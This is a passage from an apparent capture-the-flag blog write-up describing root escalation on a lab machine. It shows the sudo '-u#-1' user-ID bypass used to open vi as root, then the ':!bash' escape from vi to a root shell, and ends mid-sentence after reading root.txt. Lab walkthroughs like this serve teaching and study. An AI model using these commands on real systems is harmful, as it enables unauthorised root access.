The `sudo -l` command shows:

![Executing the sudo -l command](https://marcorei7.files.wordpress.com/2020/08/image-149.png?w=558)

I tried a lot of stuff like opening vim with the sudo command but ended up using the following command to open the vim editor in addition to the “user.txt” file:

|   |   |
|---|---|
|1|`sudo` `-u``#-1 /usr/bin/vi /home/gwendoline/user.txt`|

In vim I just had to enter:

|   |   |
|---|---|
|1|`:!``bash`|

and got root! Here I moved to the “/root” directory and `cat` out the “root.txt” 